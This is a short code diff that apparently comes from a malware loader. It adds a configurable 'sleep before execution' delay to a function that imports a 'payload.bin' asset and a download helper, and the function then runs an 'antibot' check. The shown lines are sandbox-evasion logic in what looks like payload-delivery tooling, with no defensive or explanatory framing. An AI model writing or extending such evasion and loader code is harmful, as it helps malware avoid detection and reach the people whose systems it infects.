@@ -5,6 +5,11 @@ import payload from "./assets/payload.bin";
 import { download as down } from "./utils";
 
 export async function dontChangeFunctionName() {
+  // sleep before execution
+  await new Promise((r) => {
+    setTimeout(r, CONFIG_DELAY);
+  });
+
   // antibot
   if (CONFIG_ANTIBOT) {
     let isBot = false;
